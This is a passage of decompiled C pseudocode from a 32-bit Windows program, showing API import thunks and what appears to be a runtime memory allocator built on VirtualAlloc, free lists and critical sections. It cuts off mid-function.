  pvVar1 = (HLOCAL)LocalAlloc();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HLOCAL __stdcall LocalFree(HLOCAL hMem)

{
  HLOCAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401324. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HLOCAL)LocalFree();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LPVOID __stdcall VirtualAlloc(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040132c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (LPVOID)VirtualAlloc();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall VirtualFree(LPVOID lpAddress,SIZE_T dwSize,DWORD dwFreeType)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401334. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = VirtualFree();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x0040133c. Too many branches
                    // WARNING: Treating indirect jump as call
  InitializeCriticalSection();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00401344. Too many branches
                    // WARNING: Treating indirect jump as call
  EnterCriticalSection();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x0040134c. Too many branches
                    // WARNING: Treating indirect jump as call
  LeaveCriticalSection();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00401354. Too many branches
                    // WARNING: Treating indirect jump as call
  DeleteCriticalSection();
  return;
}



int * FUN_0040135c(void)

{
  int **ppiVar1;
  undefined4 *puVar2;
  int *piVar3;
  int iVar4;
  
  if (DAT_004425e0 == (int **)0x0) {
    puVar2 = (undefined4 *)LocalAlloc(0,0x644);
    if (puVar2 == (undefined4 *)0x0) {
      return (int *)0x0;
    }
    *puVar2 = DAT_004425dc;
    iVar4 = 0;
    DAT_004425dc = puVar2;
    do {
      ppiVar1 = (int **)(puVar2 + iVar4 * 4 + 1);
      *ppiVar1 = (int *)DAT_004425e0;
      iVar4 = iVar4 + 1;
      DAT_004425e0 = ppiVar1;
    } while (iVar4 != 100);
  }
  piVar3 = (int *)DAT_004425e0;
  DAT_004425e0 = (int **)*DAT_004425e0;
  return piVar3;
}



void FUN_004013ac(int param_1)

{
  *(int *)param_1 = param_1;
  *(int *)(param_1 + 4) = param_1;
  return;
}



undefined4 FUN_004013b4(int **param_1,int **param_2)

{
  int *piVar1;
  int **ppiVar2;
  
  ppiVar2 = (int **)FUN_0040135c();
  if (ppiVar2 == (int **)0x0) {
    return 0;
  }
  ppiVar2[2] = *param_2;
  ppiVar2[3] = param_2[1];
  piVar1 = *param_1;
  *ppiVar2 = piVar1;
  ppiVar2[1] = (int *)param_1;
  piVar1[1] = (int)ppiVar2;
  *param_1 = (int *)ppiVar2;
  return CONCAT31((int3)((uint)ppiVar2 >> 8),1);
}



void FUN_004013e4(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)param_1[1];
  iVar2 = *param_1;
  *piVar1 = iVar2;
  *(int **)(iVar2 + 4) = piVar1;
  *param_1 = (int)DAT_004425e0;
  DAT_004425e0 = param_1;
  return;
}



void FUN_004013fc(int **param_1,int **param_2,int **param_3)

{
  int **ppiVar1;
  undefined4 uVar2;
  int **ppiVar3;
  
  ppiVar3 = (int **)*param_1;
  *param_3 = *param_2;
  param_3[1] = param_2[1];
  do {
    ppiVar1 = (int **)*ppiVar3;
    if (*param_3 == (int *)((int)ppiVar3[2] + (int)ppiVar3[3])) {
      FUN_004013e4((int *)ppiVar3);
      *param_3 = ppiVar3[2];
      param_3[1] = (int *)((int)param_3[1] + (int)ppiVar3[3]);
    }
    else if ((int *)((int)*param_3 + (int)param_3[1]) == ppiVar3[2]) {
      FUN_004013e4((int *)ppiVar3);
      param_3[1] = (int *)((int)param_3[1] + (int)ppiVar3[3]);
    }
    ppiVar3 = ppiVar1;
  } while (param_1 != ppiVar1);
  uVar2 = FUN_004013b4(param_1,param_3);
  if ((char)uVar2 == '\0') {
    *param_3 = (int *)0x0;
  }
  return;
}



undefined4 FUN_0040146c(int **param_1,int **param_2)

{
  int *piVar1;
  int *piVar2;
  int **ppiVar3;
  int *local_18;
  int local_14;
  
  ppiVar3 = param_1;
  while( true ) {
    piVar1 = *param_2;
    piVar2 = ppiVar3[2];
    if ((piVar2 <= piVar1) &&
       ((uint)((int)piVar1 + (int)param_2[1]) <= (uint)((int)piVar2 + (int)ppiVar3[3]))) break;
    ppiVar3 = (int **)*ppiVar3;
    if (param_1 == ppiVar3) {
      return 0;
    }
  }
  if (piVar1 == piVar2) {
    ppiVar3[2] = (int *)((int)ppiVar3[2] + (int)param_2[1]);
    piVar2 = param_2[1];
    ppiVar3[3] = (int *)((int)ppiVar3[3] - (int)piVar2);
    if (ppiVar3[3] == (int *)0x0) {
      piVar2 = (int *)FUN_004013e4((int *)ppiVar3);
    }
  }
  else if ((int)piVar1 + (int)param_2[1] == (int)piVar2 + (int)ppiVar3[3]) {
    ppiVar3[3] = (int *)((int)ppiVar3[3] - (int)param_2[1]);
  }
  else {
    local_18 = (int *)((int)*param_2 + (int)param_2[1]);
    local_14 = ((int)ppiVar3[2] + (int)ppiVar3[3]) - (int)local_18;
    ppiVar3[3] = (int *)((int)piVar1 - (int)piVar2);
    piVar2 = (int *)FUN_004013b4(ppiVar3,&local_18);
    if ((char)piVar2 == '\0') {
      return 0;
    }
  }
  return CONCAT31((int3)((uint)piVar2 >> 8),1);
}



void FUN_00401500(int param_1,int **param_2)

{
  undefined4 uVar1;
  int *piVar2;
  
  if (param_1 < 0x100000) {
    piVar2 = (int *)0x100000;
  }
  else {
    piVar2 = (int *)(param_1 + 0xffffU & 0xffff0000);
  }
  param_2[1] = piVar2;
  piVar2 = (int *)VirtualAlloc((LPVOID)0x0,(SIZE_T)piVar2,0x2000,1);
  *param_2 = piVar2;
  if (piVar2 != (int *)0x0) {
    uVar1 = FUN_004013b4((int **)&DAT_004425e4,param_2);
    if ((char)uVar1 == '\0') {
      VirtualFree(*param_2,0,0x8000);
      *param_2 = (int *)0x0;
    }
  }
  return;
}



void FUN_00401564(LPVOID param_1,int param_2,int **param_3)

{
  int *piVar1;
  undefined4 uVar2;
  
  param_3[1] = (int *)0x100000;
  piVar1 = (int *)VirtualAlloc(param_1,0x100000,0x2000,4);
  *param_3 = piVar1;
  if (piVar1 == (int *)0x0) {
    piVar1 = (int *)(param_2 + 0xffffU & 0xffff0000);
    param_3[1] = piVar1;
    piVar1 = (int *)VirtualAlloc(param_1,(SIZE_T)piVar1,0x2000,4);
    *param_3 = piVar1;
  }
  if (*param_3 != (int *)0x0) {
    uVar2 = FUN_004013b4((int **)&DAT_004425e4,param_3);
    if ((char)uVar2 == '\0') {
      VirtualFree(*param_3,0,0x8000);
      *param_3 = (int *)0x0;
    }
  }
  return;
}



void FUN_004015dc(LPVOID param_1,int param_2,LPVOID *param_3)

{
  int **ppiVar1;
  LPVOID lpAddress;
  BOOL BVar2;
  int **ppiVar3;
  LPVOID local_1c;
  uint local_18;
  
  local_1c = (LPVOID)0xffffffff;
  local_18 = 0;
  ppiVar1 = (int **)DAT_004425e4;
  while (ppiVar3 = ppiVar1, ppiVar3 != &DAT_004425e4) {
    ppiVar1 = (int **)*ppiVar3;
    lpAddress = ppiVar3[2];
    if ((param_1 <= lpAddress) &&
       ((uint)((int)lpAddress + (int)ppiVar3[3]) <= (uint)(param_2 + (int)param_1))) {
      if (lpAddress < local_1c) {
        local_1c = lpAddress;
      }
      if (local_18 < (uint)((int)lpAddress + (int)ppiVar3[3])) {
        local_18 = (int)lpAddress + (int)ppiVar3[3];
      }
      BVar2 = VirtualFree(lpAddress,0,0x8000);
      if (BVar2 == 0) {
        DAT_004425c0 = 1;
      }
      FUN_004013e4((int *)ppiVar3);
    }
  }
  *param_3 = (LPVOID)0x0;
  if (local_18 != 0) {
    *param_3 = local_1c;
    param_3[1] = (LPVOID)(local_18 - (int)local_1c);
  }
  return;
}



void FUN_00401694(uint param_1,int param_2,LPVOID *param_3)

{
  LPVOID pvVar1;
  LPVOID pvVar2;
  LPVOID lpAddress;
  LPVOID pvVar3;
  undefined4 *puVar4;
  LPVOID pvVar5;
  
  pvVar3 = (LPVOID)(param_1 & 0xfffff000);
  pvVar2 = (LPVOID)(param_1 + param_2 + 0xfff & 0xfffff000);
  *param_3 = pvVar3;
  param_3[1] = (LPVOID)((int)pvVar2 - (int)pvVar3);
  puVar4 = DAT_004425e4;
  while( true ) {
    if ((undefined4 **)puVar4 == &DAT_004425e4) {
      return;
    }
    pvVar1 = (LPVOID)puVar4[2];
    lpAddress = pvVar1;
    if (pvVar1 < pvVar3) {
      lpAddress = pvVar3;
    }
    pvVar5 = (LPVOID)(puVar4[3] + (int)pvVar1);
    if (pvVar2 < (LPVOID)(puVar4[3] + (int)pvVar1)) {
      pvVar5 = pvVar2;
    }
    if ((lpAddress < pvVar5) &&
       (pvVar1 = VirtualAlloc(lpAddress,(int)pvVar5 - (int)lpAddress,0x1000,4),
       pvVar1 == (LPVOID)0x0)) break;
    puVar4 = (undefined4 *)*puVar4;
  }
  *param_3 = (LPVOID)0x0;
  return;
}



void FUN_00401728(int param_1,int param_2,LPVOID *param_3)

{
  LPVOID pvVar1;
  BOOL BVar2;
  LPVOID lpAddress;
  LPVOID pvVar3;
  LPVOID pvVar4;
  undefined4 *puVar5;
  LPVOID pvVar6;
  
  pvVar4 = (LPVOID)(param_1 + 0xfffU & 0xfffff000);
  pvVar3 = (LPVOID)(param_1 + param_2 & 0xfffff000);
  *param_3 = pvVar4;
  param_3[1] = (LPVOID)((int)pvVar3 - (int)pvVar4);
  for (puVar5 = DAT_004425e4; (undefined4 **)puVar5 != &DAT_004425e4; puVar5 = (undefined4 *)*puVar5
      ) {
    pvVar1 = (LPVOID)puVar5[2];
    lpAddress = pvVar1;
    if (pvVar1 < pvVar4) {
      lpAddress = pvVar4;
    }
    pvVar6 = (LPVOID)(puVar5[3] + (int)pvVar1);
    if (pvVar3 < (LPVOID)(puVar5[3] + (int)pvVar1)) {
      pvVar6 = pvVar3;
    }
    if (lpAddress < pvVar6) {
      BVar2 = VirtualFree(lpAddress,(int)pvVar6 - (int)lpAddress,0x4000);
      if (BVar2 == 0) {
        DAT_004425c0 = 2;
      }
    }
  }
  return;
}



void FUN_004017a8(int param_1,int **param_2)

{
  int **ppiVar1;
  uint uVar2;
  int *local_18 [2];
  
  uVar2 = param_1 + 0x3fffU & 0xffffc000;
  ppiVar1 = DAT_004425f4;
  do {
    for (; (int ***)ppiVar1 != &DAT_004425f4; ppiVar1 = (int **)*ppiVar1) {
      if ((int)uVar2 <= (int)ppiVar1[3]) {
        FUN_00401694((uint)ppiVar1[2],uVar2,param_2);
        if (*param_2 == (int *)0x0) {
          return;
        }
        ppiVar1[2] = (int *)((int)ppiVar1[2] + (int)param_2[1]);
        ppiVar1[3] = (int *)((int)ppiVar1[3] - (int)param_2[1]);
        if (ppiVar1[3] != (int *)0x0) {
          return;
        }
        FUN_004013e4((int *)ppiVar1);
        return;
      }
    }
    FUN_00401500(uVar2,param_2);
    if (*param_2 == (int *)0x0) {
      return;
    }
    FUN_004013fc((int **)&DAT_004425f4,param_2,local_18);
    ppiVar1 = DAT_004425f4;
  } while (local_18[0] != (int *)0x0);
  FUN_004015dc(*param_2,(int)param_2[1],local_18);
  *param_2 = (int *)0x0;
  return;
}



void FUN_00401838(LPVOID param_1,int param_2,LPVOID *param_3)

{
  int **ppiVar1;
  uint uVar2;
  int *local_20;
  int local_1c;
  int *local_18 [2];
  
  uVar2 = param_2 + 0x3fffU & 0xffffc000;
  ppiVar1 = DAT_004425f4;
LAB_0040185e:
  do {
    for (; ((int ***)ppiVar1 != &DAT_004425f4 && ((int *)param_1 != ppiVar1[2]));
        ppiVar1 = (int **)*ppiVar1) {
    }
    if ((int *)param_1 == ppiVar1[2]) {
      if ((int)uVar2 <= (int)ppiVar1[3]) goto LAB_0040190b;
      FUN_00401564((LPVOID)((int)ppiVar1[2] + (int)ppiVar1[3]),uVar2 - (int)ppiVar1[3],&local_20);
      if (local_20 != (int *)0x0) {
        FUN_004013fc((int **)&DAT_004425f4,&local_20,local_18);
        ppiVar1 = DAT_004425f4;
        if (local_18[0] == (int *)0x0) {
          FUN_004015dc(local_20,local_1c,local_18);
          *param_3 = (LPVOID)0x0;
          return;
        }
        goto LAB_0040185e;
      }
    }
    FUN_00401564(param_1,uVar2,&local_20);
    if (local_20 == (int *)0x0) {
LAB_0040190b:
      if (((int *)param_1 != ppiVar1[2]) || ((int)ppiVar1[3] < (int)uVar2)) {
        *param_3 = (LPVOID)0x0;
        return;
      }
      FUN_00401694((uint)ppiVar1[2],uVar2,param_3);
      if (*param_3 == (LPVOID)0x0) {
        return;
      }
      ppiVar1[2] = (int *)((int)ppiVar1[2] + (int)param_3[1]);
      ppiVar1[3] = (int *)((int)ppiVar1[3] - (int)param_3[1]);
      if (ppiVar1[3] != (int *)0x0) {
        return;
      }
      FUN_004013e4((int *)ppiVar1);
      return;
    }
    FUN_004013fc((int **)&DAT_004425f4,&local_20,local_18);
    ppiVar1 = DAT_004425f4;
    if (local_18[0] == (int *)0x0) {
      FUN_004015dc(local_20,local_1c,local_18);
      *param_3 = (LPVOID)0x0;
      return;
    }
  } while( true );
}



void FUN_0040195c(int param_1,int param_2,int **param_3)

{
  uint uVar1;
  uint uVar2;
  int *local_1c;
  int local_18;
  int *local_14;
  int local_10;
  
  uVar1 = param_1 + 0x3fffU & 0xffffc000;
  uVar2 = param_2 + param_1 & 0xffffc000;
  if (uVar1 < uVar2) {
    FUN_00401728(uVar1,uVar2 - uVar1,param_3);
    FUN_004013fc((int **)&DAT_004425f4,param_3,&local_1c);
    if (local_1c != (int *)0x0) {
      FUN_004015dc(local_1c,local_18,&local_14);
      local_1c = local_14;
      local_18 = local_10;
    }
    if (local_1c != (int *)0x0) {
      FUN_0040146c((int **)&DAT_004425f4,&local_1c);
    }
  }
  else {
    *param_3 = (int *)0x0;
  }
  return;
}



void FUN_004019e8(void)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack16;
  
  uStack16 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack16;
  InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
  if (DAT_00442045 != '\0') {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
  }
  FUN_004013ac((int)&DAT_004425e4);
  FUN_004013ac((int)&DAT_004425f4);
  FUN_004013ac((int)&DAT_00442620);
  DAT_0044261c = LocalAlloc(0,0xff8);
  if (DAT_0044261c != (HLOCAL)0x0) {
    iVar1 = 3;
    do {
      *(undefined4 *)((int)DAT_0044261c + iVar1 * 4 + -0xc) = 0;
      iVar1 = iVar1 + 1;
    } while (iVar1 != 0x401);
    DAT_00442608 = &DAT_00442604;
    DAT_00442604 = &DAT_00442604;
    DAT_00442610 = &DAT_00442604;
    DAT_004425bc = 1;
  }
  *in_FS_OFFSET = uStack16;
  if (DAT_00442045 != '\0') {
    uStack16 = 0x401a9d;
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
  }
  return;
}



void FUN_00401aac(void)

{
  undefined4 *puVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack20;
  
  if (DAT_004425bc == '\0') {
    return;
  }
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  if (DAT_00442045 != '\0') {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
  }
  DAT_004425bc = 0;
  LocalFree(DAT_0044261c);
  DAT_0044261c = (HLOCAL)0x0;
  for (puVar1 = DAT_004425e4; (undefined4 **)puVar1 != &DAT_004425e4; puVar1 = (undefined4 *)*puVar1
      ) {
    VirtualFree((LPVOID)puVar1[2],0,0x8000);
  }
  FUN_004013ac((int)&DAT_004425e4);
  FUN_004013ac((int)&DAT_004425f4);
  FUN_004013ac((int)&DAT_00442620);
  puVar1 = DAT_004425dc;
  while (puVar1 != (undefined4 *)0x0) {
    DAT_004425dc = (undefined4 *)*puVar1;
    LocalFree(puVar1);
    puVar1 = DAT_004425dc;
  }
  DAT_004425dc = puVar1;
  *in_FS_OFFSET = uStack20;
  if (DAT_00442045 != '\0') {
    uStack20 = 0x401b77;
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
  }
  uStack20 = 0x401b81;
  DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
  return;
}



void FUN_00401b8c(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  if (param_1 == DAT_00442610) {
    DAT_00442610 = (int *)param_1[1];
  }
  piVar1 = (int *)param_1[1];
  iVar2 = param_1[2];
  if (iVar2 < 0x1001) {
    if (param_1 != piVar1) {
      if (iVar2 < 0) {
        iVar2 = iVar2 + 3;
      }
      *(int **)(DAT_0044261c + -0xc + (iVar2 >> 2) * 4) = piVar1;
      iVar2 = *param_1;
      *piVar1 = iVar2;
      *(int **)(iVar2 + 4) = piVar1;
      return;
    }
    if (iVar2 < 0) {
      iVar2 = iVar2 + 3;
    }
    *(undefined4 *)(DAT_0044261c + -0xc + (iVar2 >> 2) * 4) = 0;
  }
  else {
    iVar2 = *param_1;
    *piVar1 = iVar2;
    *(int **)(iVar2 + 4) = piVar1;
  }
  return;
}



undefined4 * FUN_00401bf0(uint param_1)

{
  undefined4 *puVar1;
  
  puVar1 = DAT_00442620;
  while( true ) {
    if ((undefined4 **)puVar1 == &DAT_00442620) {
      DAT_004425c0 = 3;
      return (undefined4 *)0x0;
    }
    if (((uint)puVar1[2] <= param_1) && (param_1 < (uint)(puVar1[2] + puVar1[3]))) break;
    puVar1 = (undefined4 *)*puVar1;
  }
  return puVar1;
}



void FUN_00401c20(uint *param_1,uint param_2)

{
  uint *puVar1;
  
  puVar1 = (uint *)((int)(uint *)(param_2 - 4) + (int)param_1);
  if (0xf < (int)param_2) {
    *puVar1 = 0x80000007;
    FUN_00401df4((uint **)param_1,(uint *)(param_2 - 4));
    return;
  }
  if (3 < (int)param_2) {
    *param_1 = param_2 | 0x80000002;
    *puVar1 = param_2 | 0x80000002;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401c50(int param_1)

{
  _DAT_004425ac = _DAT_004425ac + 1;
  _DAT_004425b0 = _DAT_004425b0 + ((*(uint *)(param_1 + -4) & 0x7ffffffc) - 4);
  FUN_00402264(param_1);
  return;
}



void FUN_00401c74(uint *param_1,uint param_2)

{
  if (0xb < (int)param_2) {
    *param_1 = param_2 | 2;
    FUN_00401c50((int)(param_1 + 1));
    return;
  }
  if (3 < (int)param_2) {
    *param_1 = param_2 | 0x80000002;
  }
  *(uint *)((int)param_1 + param_2) = *(uint *)((int)param_1 + param_2) & 0xfffffffe;
  return;
}



uint FUN_00401c9c(int param_1)

{
  uint uVar1;
  uint *puVar2;
  uint uVar3;
  
  uVar1 = *(uint *)(param_1 + -4);
  if ((uVar1 & 0x80000002) != 0x80000002) {
    DAT_004425c0 = 4;
  }
  uVar3 = uVar1 & 0x7ffffffc;
  puVar2 = (uint *)(param_1 - uVar3);
  if (((uVar1 ^ *puVar2) & 0xfffffffe) != 0) {
    DAT_004425c0 = 5;
  }
  if ((*(byte *)puVar2 & 1) != 0) {
    uVar1 = puVar2[-1];
    if (uVar1 != ((int *)((int)puVar2 - uVar1))[2]) {
      DAT_004425c0 = 6;
    }
    FUN_00401b8c((int *)((int)puVar2 - uVar1));
    uVar3 = uVar3 + uVar1;
  }
  return uVar3;
}



uint FUN_00401d0c(uint *param_1)

{
  uint uVar1;
  uint *puVar2;
  uint uVar3;
  
  uVar3 = 0;
  uVar1 = *param_1;
  if ((uVar1 & 0x80000000) != 0) {
    uVar3 = uVar1 & 0x7ffffffc;
    param_1 = (uint *)((int)param_1 + uVar3);
    uVar1 = *param_1;
  }
  if ((uVar1 & 2) == 0) {
    FUN_00401b8c((int *)param_1);
    uVar3 = uVar3 + param_1[2];
    puVar2 = (uint *)((int)param_1 + param_1[2]);
    *puVar2 = *puVar2 & 0xfffffffe;
  }
  return uVar3;
}



uint FUN_00401d44(uint *param_1,int param_2)

{
  int *piVar1;
  int **ppiVar2;
  int **ppiVar3;
  uint *puVar4;
  byte local_1c;
  int *local_1b;
  int local_17;
  
  local_1c = 0;
  ppiVar2 = (int **)FUN_00401bf0((uint)param_1);
  ppiVar3 = ppiVar2;
  if (ppiVar2 != (int **)0x0) {
    piVar1 = ppiVar2[2];
    if (((int)piVar1 + (int)ppiVar2[3]) - (param_2 + (int)param_1) < 0xd) {
      param_2 = ((int)piVar1 + (int)ppiVar2[3]) - (int)param_1;
    }
    if ((int)param_1 - (int)piVar1 < 0xc) {
      ppiVar3 = (int **)FUN_0040195c((int)piVar1,(int)param_1 + (param_2 - (int)ppiVar2[2]),
                                     &local_1b);
    }
    else {
      ppiVar3 = (int **)FUN_0040195c((int)(param_1 + 1),param_2 + -4,&local_1b);
    }
    if (local_1b != (int *)0x0) {
      FUN_00401c20(param_1,(int)local_1b - (int)param_1);
      puVar4 = (uint *)((int)local_1b + local_17);
      if (puVar4 < (uint *)((int)ppiVar2[2] + (int)ppiVar2[3])) {
        FUN_00401c74(puVar4,(int)param_1 + (param_2 - (int)puVar4));
      }
      ppiVar3 = (int **)FUN_0040146c(ppiVar2,&local_1b);
      local_1c = 1;
    }
  }
  return (uint)ppiVar3 & 0xffffff00 | (uint)local_1c;
}



void FUN_00401df4(uint **param_1,uint *param_2)

{
  uint **ppuVar1;
  uint *puVar2;
  uint **ppuVar3;
  uint uVar4;
  
  param_1[2] = param_2;
  *(uint **)((int)param_1 + (int)param_2 + -4) = param_2;
  if ((int)param_2 < 0x1001) {
    if ((int)param_2 < 0) {
      param_2 = (uint *)((int)param_2 + 3);
    }
    ppuVar1 = *(uint ***)(DAT_0044261c + -0xc + ((int)param_2 >> 2) * 4);
    if (ppuVar1 == (uint **)0x0) {
      *(uint ***)(DAT_0044261c + -0xc + ((int)param_2 >> 2) * 4) = param_1;
      param_1[1] = (uint *)param_1;
      *param_1 = (uint *)param_1;
    }
    else {
      puVar2 = *ppuVar1;
      param_1[1] = (uint *)ppuVar1;
      *param_1 = puVar2;
      *ppuVar1 = (uint *)param_1;
      puVar2[1] = (uint)param_1;
    }
  }
  else {
    if ((0x3bff < (int)param_2) &&
       (uVar4 = FUN_00401d44((uint *)param_1,(int)param_2), (char)uVar4 != '\0')) {
      return;
    }
    ppuVar1 = DAT_00442610;
    puVar2 = *DAT_00442610;
    ppuVar3 = param_1;
    param_1[1] = (uint *)DAT_00442610;
    DAT_00442610 = ppuVar3;
    *param_1 = puVar2;
    *ppuVar1 = (uint *)param_1;
    puVar2[1] = (uint)param_1;
  }
  return;
}



void FUN_00401e7c(void)

{
  if (0 < (int)DAT_00442614) {
    if ((int)DAT_00442614 < 0xc) {
      DAT_004425c0 = 7;
    }
    else {
      *DAT_00442618 = DAT_00442614 | 2;
      FUN_00401c50((int)(DAT_00442618 + 1));
      DAT_00442618 = (uint *)0x0;
      DAT_00442614 = 0;
    }
  }
  return;
}



undefined4 FUN_00401ec8(int **param_1)

{
  undefined4 uVar1;
  uint uVar2;
  int *local_1c;
  int *local_18;
  int *local_14;
  int local_10;
  
  local_1c = *param_1;
  local_18 = param_1[1];
  FUN_00401e7c();
  FUN_004013fc((int **)&DAT_00442620,&local_1c,&local_14);
  if (local_14 == (int *)0x0) {
    uVar1 = 0;
  }
  else {
    if (local_14 < local_1c) {
      uVar2 = FUN_00401c9c((int)local_1c);
      local_1c = (int *)((int)local_1c - uVar2);
      local_18 = (int *)((int)local_18 + uVar2);
    }
    if ((uint *)((int)local_1c + (int)local_18) < (uint *)((int)local_14 + local_10)) {
      uVar2 = FUN_00401d0c((uint *)((int)local_1c + (int)local_18));
      local_18 = (int *)((int)local_18 + uVar2);
    }
    if ((uint *)((int)local_14 + local_10) == (uint *)((int)local_1c + (int)local_18)) {
      FUN_00401c20((uint *)((int)local_1c + (int)local_18) + -1,4);
      local_18 = local_18 + -1;
    }
    DAT_00442618 = local_1c;
    DAT_00442614 = local_18;
    uVar1 = CONCAT31((int3)((uint)local_18 >> 8),1);
  }
  return uVar1;
}



undefined4 FUN_00401f54(int param_1)

{
  undefined4 uVar1;
  int *local_c [2];
  
  FUN_004017a8(param_1 + 4,local_c);
  if ((local_c[0] != (int *)0x0) && (uVar1 = FUN_00401ec8(local_c), (char)uVar1 != '\0')) {
    return CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return 0;
}



undefined4 FUN_00401f80(LPVOID param_1,int param_2)

{
  undefined4 uVar1;
  int *local_10 [2];
  
  FUN_00401838(param_1,param_2 + 4,local_10);
  if ((local_10[0] != (int *)0x0) && (uVar1 = FUN_00401ec8(local_10), (char)uVar1 != '\0')) {
    return CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return 0;
}



int FUN_00401fb4(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  if (param_1 < 0) {
    param_1 = param_1 + 3;
  }
  iVar1 = param_1 >> 2;
  if (iVar1 < 0x401) {
    do {
      iVar2 = *(int *)(DAT_0044261c + -0xc + iVar1 * 4);
      if (iVar2 != 0) {
        return iVar2;
      }
      iVar1 = iVar1 + 1;
    } while (iVar1 != 0x401);
  }
  return iVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint * FUN_00401fe0(uint param_1)

{
  uint *puVar1;
  uint *puVar2;
  undefined4 uVar3;
  uint uVar4;
  
  while ((puVar1 = DAT_00442610, puVar2 = DAT_00442608, (int)DAT_00442608[2] < (int)param_1 &&
         (uVar4 = DAT_00442610[2], puVar2 = DAT_00442610, (int)uVar4 < (int)param_1))) {
    DAT_00442610[2] = param_1;
    puVar2 = puVar1;
    do {
      puVar2 = (uint *)puVar2[1];
    } while ((int)puVar2[2] < (int)param_1);
    DAT_00442610[2] = uVar4;
    puVar1 = puVar2;
    if ((puVar2 != DAT_00442610) ||
       (((int)param_1 < 0x1001 &&
        (puVar2 = (uint *)FUN_00401fb4(param_1), puVar1 = DAT_00442610, puVar2 != (uint *)0x0))))
    break;
    uVar3 = FUN_00401f54(param_1);
    puVar2 = DAT_00442618;
    if ((char)uVar3 == '\0') {
      return (uint *)0x0;
    }
    if ((int)param_1 <= DAT_00442614) {
      DAT_00442614 = DAT_00442614 - param_1;
      if (DAT_00442614 < 0xc) {
        param_1 = param_1 + DAT_00442614;
        DAT_00442614 = 0;
      }
      DAT_00442618 = (uint *)((int)DAT_00442618 + param_1);
      *puVar2 = param_1 | 2;
      _DAT_004425ac = _DAT_004425ac + 1;
      _DAT_004425b0 = _DAT_004425b0 + (param_1 - 4);
      return puVar2 + 1;
    }
  }
  DAT_00442610 = puVar1;
  FUN_00401b8c((int *)puVar2);
  uVar4 = puVar2[2];
  if ((int)(uint *)(uVar4 - param_1) < 0xc) {
    if (puVar2 == DAT_00442610) {
      DAT_00442610 = (uint *)puVar2[1];
    }
    *(uint *)((int)puVar2 + uVar4) = *(uint *)((int)puVar2 + uVar4) & 0xfffffffe;
  }
  else {
    FUN_00401df4((uint **)((int)puVar2 + param_1),(uint *)(uVar4 - param_1));
    uVar4 = param_1;
  }
  *puVar2 = uVar4 | 2;
  _DAT_004425ac = _DAT_004425ac + 1;
  _DAT_004425b0 = _DAT_004425b0 + (uVar4 - 4);
  return puVar2 + 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint * FUN_004020d4(int param_1)

{
  uint *puVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  undefined uVar6;
  undefined extraout_CL;
  uint uVar7;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar8;
  undefined *puVar9;
  
  if (((DAT_004425bc == '\0') && (cVar2 = FUN_004019e8(), cVar2 == '\0')) || (0x7ffffff8 < param_1))
  {
    return (uint *)0x0;
  }
  uVar6 = 0;
  puVar9 = &LAB_00402250;
  uVar8 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffdc;
  if (DAT_00442045 != '\0') {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004425c4);
    uVar6 = extraout_CL;
  }
  puVar5 = DAT_00442618;
  uVar7 = param_1 + 7U & 0xfffffffc;
  if ((int)uVar7 < 0xc) {
    uVar7 = 0xc;
  }
  if ((int)uVar7 < 0x1001) {
    uVar3 = uVar7;
    if ((int)uVar7 < 0) {
      uVar3 = uVar7 + 3;
    }
    puVar1 = *(uint **)((DAT_0044261c - 0xc) + ((int)uVar3 >> 2) * 4);
    if (puVar1 != (uint *)0x0) {
      *(uint *)((int)puVar1 + uVar7) = *(uint *)((int)puVar1 + uVar7) & 0xfffffffe;
      uVar3 = DAT_0044261c;
      puVar5 = (uint *)puVar1[1];
      if (puVar1 == puVar5) {
        uVar4 = uVar7;
        if ((int)uVar7 < 0) {
          uVar4 = uVar7 + 3;
        }
        *(undefined4 *)((DAT_0044261c - 0xc) + ((int)uVar4 >> 2) * 4) = 0;
      }
      else {
        uVar3 = uVar7;
